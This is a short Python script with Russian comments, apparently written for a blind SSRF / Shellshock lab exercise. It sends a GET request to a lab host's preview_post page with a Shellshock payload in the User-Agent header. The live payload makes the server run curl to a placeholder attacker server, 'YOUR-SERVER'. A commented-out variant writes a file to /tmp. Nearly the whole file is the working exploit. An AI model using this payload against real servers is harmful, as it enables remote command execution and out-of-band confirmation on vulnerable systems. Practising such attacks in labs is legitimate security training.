# import requests
#
# # Адрес твоего сайта (Flask)
# LAB_URL = "http://localhost:8000/preview_post/1"  # Подставь свой post_id
#
# # Подделанный User-Agent с payload (shellshock или твой кастомный флаг)
# UA_PAYLOAD = "shellshock-tester"  # Или '() { :; }; echo hacked > /tmp/pwned'
#
# # Делаем обычный GET-запрос к preview_post, подставляем User-Agent
# r = requests.get(LAB_URL, headers={
#     "User-Agent": UA_PAYLOAD
# })
#
# print("Status:", r.status_code)
# print("Response preview page:", r.text[:300], "...")
#
import requests

url = "http://laplasrouse3-blind_ssrf_shellshock.labs-is-here.online/preview_post/1"
headers = {
    "User-Agent": "() { :; }; curl http://YOUR-SERVER/"
}
r = requests.get(url, headers=headers)
print(r.text)

